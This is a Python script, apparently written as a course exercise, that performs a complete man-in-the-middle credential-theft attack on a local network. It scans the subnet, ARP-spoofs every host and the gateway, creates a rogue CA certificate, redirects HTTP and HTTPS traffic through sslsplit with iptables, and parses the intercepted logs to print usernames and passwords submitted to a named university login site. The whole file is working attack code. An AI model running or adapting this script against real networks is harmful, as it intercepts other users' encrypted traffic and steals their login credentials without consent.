#!/usr/bin/env python3
# -*- coding: UTF-8 -*-

import os
import time
import netifaces
import sys
from scapy.layers.http import *
from scapy.all import srp,Ether,ARP,conf
import scapy.all as scapy
import threading



def get_mac(ip):
	arp_request = scapy.ARP(pdst = ip)
    #broadcast at Mac layer
	broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
    #join the info into a message
	arp_request_broadcast = broadcast / arp_request
    #srp -> return two lists of ip with one response to the broadcast and the other don't
	answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0]
    #.hwsrc store the matched ip
	return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    #create spoofed packet
	packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip),psrc = spoof_ip)
    #send -> start spoofing
	scapy.send(packet, verbose = False)


def restore(destination_ip, source_ip):
	destination_mac = get_mac(destination_ip)
	source_mac = get_mac(source_ip)
	packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
	scapy.send(packet, verbose = False)

def address_collection():
    #get the interface
    interface = netifaces.interfaces()
    #get the gateway of all interfaces
    gateways = netifaces.gateways()
    #find the default gateway
    default_gateway = gateways['default'][netifaces.AF_INET] # netifaces.AF_INET = 2
    #print('default gateway: ',default_gateway) #('192.168.64.2','ens33')

    # use broadcast
    arp_req = scapy.ARP(pdst = str(default_gateway[0])+'/24')
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    arp_req_broadcast = broadcast/arp_req
    ans = scapy.srp(arp_req_broadcast,timeout = 1, verbose = False)[0]
    address = []
    for i in ans:
        tmp = [i[1].psrc, i[1].hwsrc]# ip, mac
        if i[1].psrc == default_gateway[0]:
            gateway_info = [i[1].psrc, i[1].hwsrc]
        address.append(tmp)
        
    # return gateway and other victims' ip and MAC
    return gateway_info,address

    
def arp_spoofing(addr_list,gateway_ip):
    
    try:
        while True:
            for addr in addr_list:
                if addr[0]!= gateway_ip:
                    target_ip=addr[0]
                    #attacker forge itself 
                    spoof(target_ip,gateway_ip)
                    spoof(gateway_ip,target_ip)
                    
            time.sleep(2)

    except KeyboardInterrupt:
        for addr in addr_list:
            if addr[0]!= gateway_ip:
                target_ip=addr[0]
                #recover the mac table
                restore(gateway_ip,target_ip)
                restore(target_ip,gateway_ip)

def sslsplit():
    #generate CA certificate by using attacker's private key
    os.system("openssl genrsa -out ca.key 4096")
    os.system("openssl req -new -x509 -days 1826 -key ca.key -out ca.crt") 

    # set iptable
    os.system('sysctl -w net.ipv4.ip_forward=1')
    os.system('iptables -t nat -F')
    os.system('iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080')
    os.system('iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443')
    
    #run sslsplit
    os.system('sslsplit -d -P -l connections.log -j ./ -S ./logs -k ca.key -c ca.crt https 0.0.0.0 8443 tcp 0.0.0.0 8080')

def read_log():
    path = os.getcwd() + '/logs/'
    #store the log file name which containing username and password has been read
    log_filename = []
    # use while loop to read the log file
    while True:
        current_files = os.listdir(path)
        for files in current_files:
            # check if the file containing username and password has been read
            if files not in log_filename:
                with open(path+files,'r') as f:
                    find = False
                    try:
                        for line in f:
                            # check if the website is e3
                            if 'Host: e3.nycu.edu.tw' in line:
                                find = True

                            if 'username' in line and 'password' in line and find == True:
                                # if fine username and password -> append it to the list -> avoid to read the file again
                                log_filename.append(files)
                                #based on the format -> use split to seperate username and password
                                user_info = line.split('&')
                                print('Username: ',user_info[0][9:])
                                print('Password: ',user_info[1][9:])
    
                        # after read the file -> close it
                        f.close()
                    except:
                        # if the format can't be read -> close the file
                        f.close()


## main
gateway,addr_list =address_collection()
print('Available devices')
print('-------------------------------------------')
print('IP\t\t\tMAC')
print('-------------------------------------------')
for i in addr_list:
    if i != gateway:
        print(i[0]+'\t\t'+i[1])

#create a folder -> put the log file into the folder
os.system('mkdir ./logs')
#parse the log file
parse=threading.Thread(target=read_log)
parse.start()
#run sslsplit
split=threading.Thread(target=sslsplit)
split.start()
#do ARP spoofing
arp_spoofing(addr_list,gateway[0])
#terminate threads
parse.join()
split.join()
#flush iptables
os.system("iptables --flush")